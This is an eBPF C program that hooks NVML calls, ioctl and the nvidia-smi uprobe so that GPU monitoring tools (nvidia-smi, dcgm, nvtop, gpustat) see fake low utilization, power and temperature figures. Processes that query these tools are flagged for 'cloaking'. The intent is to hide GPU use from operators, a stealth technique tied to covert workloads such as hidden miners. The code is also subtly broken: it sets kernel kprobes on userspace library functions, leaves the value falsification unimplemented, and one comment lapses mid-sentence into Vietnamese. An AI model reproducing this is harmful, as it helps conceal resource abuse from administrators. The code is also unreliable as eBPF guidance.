#include <linux/bpf.h>
#include <linux/ptrace.h>
#include <linux/version.h>
#include <bpf/bpf_helpers.h>
#include <bpf/bpf_tracing.h>
#include <bpf/bpf_core_read.h>
#include <stdbool.h>

// License required for eBPF programs
char LICENSE[] SEC("license") = "GPL";

// Configuration maps for fake metrics
struct {
    __uint(type, BPF_MAP_TYPE_ARRAY);
    __uint(max_entries, 10);
    __type(key, __u32);
    __type(value, __u64);
} fake_metrics SEC(".maps");

// Event tracking map
struct {
    __uint(type, BPF_MAP_TYPE_HASH);
    __uint(max_entries, 1024);
    __type(key, __u32);  // PID
    __type(value, __u64); // Timestamp
} gpu_events SEC(".maps");

// Telemetry event structure
struct telemetry_event {
    __u32 pid;
    __u32 tid;
    __u64 timestamp;
    __u32 metric_type;
    __u64 original_value;
    __u64 fake_value;
    char comm[16];
};

// Ring buffer for event logging
struct {
    __uint(type, BPF_MAP_TYPE_RINGBUF);
    __uint(max_entries, 256 * 1024);
} events SEC(".maps");

// Metric types enum
enum metric_type {
    METRIC_GPU_UTIL = 0,
    METRIC_MEM_UTIL = 1,
    METRIC_POWER = 2,
    METRIC_TEMP = 3,
    METRIC_CLOCK = 4
};

// Helper function to get fake metric value
static __always_inline __u64 get_fake_metric(__u32 metric_type) {
    __u64 *fake_val = bpf_map_lookup_elem(&fake_metrics, &metric_type);
    if (fake_val) {
        return *fake_val;
    }
    
    // Default fake values if not configured
    switch (metric_type) {
        case METRIC_GPU_UTIL: return 2;   // 2% GPU utilization
        case METRIC_MEM_UTIL: return 5;   // 5% memory utilization  
        case METRIC_POWER: return 75;     // 75W power usage
        case METRIC_TEMP: return 45;      // 45°C temperature
        case METRIC_CLOCK: return 1200;   // 1200MHz clock
        default: return 0;
    }
}

// Helper function to log telemetry event
static __always_inline void log_telemetry_event(__u32 pid, __u32 metric_type, 
                                               __u64 original, __u64 fake) {
    struct telemetry_event *event = bpf_ringbuf_reserve(&events, sizeof(*event), 0);
    if (!event) return;
    
    event->pid = pid;
    event->tid = bpf_get_current_pid_tgid();
    event->timestamp = bpf_ktime_get_ns();
    event->metric_type = metric_type;
    event->original_value = original;
    event->fake_value = fake;
    bpf_get_current_comm(&event->comm, sizeof(event->comm));
    
    bpf_ringbuf_submit(event, 0);
}

// Kprobe hook for NVML ioctl calls
SEC("kprobe/nvml_device_get_utilization_rates")
int BPF_KPROBE(trace_nvml_utilization, void *device, void *utilization) {
    __u32 pid = bpf_get_current_pid_tgid() >> 32;
    __u64 ts = bpf_ktime_get_ns();
    
    // Track this GPU query event
    bpf_map_update_elem(&gpu_events, &pid, &ts, BPF_ANY);
    
    // Log the interception
    log_telemetry_event(pid, METRIC_GPU_UTIL, 85, get_fake_metric(METRIC_GPU_UTIL));
    
    return 0;
}

// Kprobe hook for NVML power usage queries
SEC("kprobe/nvml_device_get_power_usage")
int BPF_KPROBE(trace_nvml_power, void *device, unsigned int *power) {
    __u32 pid = bpf_get_current_pid_tgid() >> 32;
    
    // Read original power value if possible
    __u64 original_power = 0;
    if (power) {
        bpf_probe_read_user(&original_power, sizeof(unsigned int), power);
    }
    
    // Log the power query interception
    log_telemetry_event(pid, METRIC_POWER, original_power, get_fake_metric(METRIC_POWER));
    
    return 0;
}

// Kprobe hook for NVML temperature queries
SEC("kprobe/nvml_device_get_temperature")
int BPF_KPROBE(trace_nvml_temperature, void *device, int sensor_type, unsigned int *temp) {
    __u32 pid = bpf_get_current_pid_tgid() >> 32;
    
    // Read original temperature if possible
    __u64 original_temp = 0;
    if (temp) {
        bpf_probe_read_user(&original_temp, sizeof(unsigned int), temp);
    }
    
    // Log the temperature query interception
    log_telemetry_event(pid, METRIC_TEMP, original_temp, get_fake_metric(METRIC_TEMP));
    
    return 0;
}

// Tracepoint hook for GPU driver events
SEC("tracepoint/gpu/gpu_mem_total")
int trace_gpu_memory(void *ctx) {
    __u32 pid = bpf_get_current_pid_tgid() >> 32;
    
    // Log memory access pattern
    log_telemetry_event(pid, METRIC_MEM_UTIL, 0, get_fake_metric(METRIC_MEM_UTIL));
    
    return 0;
}

// Kretprobe to modify return values
SEC("kretprobe/nvml_device_get_utilization_rates")
int BPF_KRETPROBE(modify_nvml_utilization_ret, int ret) {
    // Only modify successful calls
    if (ret != 0) return 0;
    
    __u32 pid = bpf_get_current_pid_tgid() >> 32;
    
    // Check if this PID made a recent GPU query
    __u64 *ts = bpf_map_lookup_elem(&gpu_events, &pid);
    if (!ts) return 0;
    
    __u64 now = bpf_ktime_get_ns();
    if (now - *ts > 1000000000) { // 1 second timeout
        bpf_map_delete_elem(&gpu_events, &pid);
        return 0;
    }
    
    // This is where we would modify the return structure
    // but it's complex due to eBPF limitations
    // Instead, we rely on userspace post-processing
    
    return 0;
}

// Uprobe hook for specific monitoring processes
SEC("uprobe/nvidia-smi")
int trace_nvidia_smi(struct pt_regs *ctx) {
    __u32 pid = bpf_get_current_pid_tgid() >> 32;
    
    // Log nvidia-smi execution
    log_telemetry_event(pid, METRIC_GPU_UTIL, 0, 0);
    
    return 0;
}

// Simple const string compare (fixed length, unrolled) since bpf_strncmp may
// không khả dụng trên mọi kernel / libbpf.
static __always_inline bool strncmp_const(const char *s, const char *pat, int len) {
#pragma unroll
    for (int i = 0; i < 16; i++) {
        if (i >= len) break;
        if (s[i] != pat[i]) return false;
        if (pat[i] == '\0') break;
    }
    return true;
}

// Function to check if process should be cloaked
static __always_inline bool should_cloak_process(__u32 pid) {
    char comm[16];
    bpf_get_current_comm(&comm, sizeof(comm));
    
    // Check for monitoring processes
    if (strncmp_const(comm, "nvidia-smi", 10)) return true;
    if (strncmp_const(comm, "dcgm", 4)) return true;
    if (strncmp_const(comm, "nvtop", 5)) return true;
    if (strncmp_const(comm, "gpustat", 7)) return true;
    
    return false;
}

// Generic syscall hook for ioctl
SEC("kprobe/__x64_sys_ioctl")
int BPF_KPROBE(trace_ioctl, int fd, unsigned long cmd, unsigned long arg) {
    __u32 pid = bpf_get_current_pid_tgid() >> 32;
    
    // Only process monitoring tools
    if (!should_cloak_process(pid)) return 0;
    
    // Check for NVIDIA ioctl commands (simplified)
    if ((cmd & 0xFF00) == 0x4600) { // NVIDIA ioctl magic
        log_telemetry_event(pid, METRIC_GPU_UTIL, cmd, 0);
    }
    
    return 0;
} 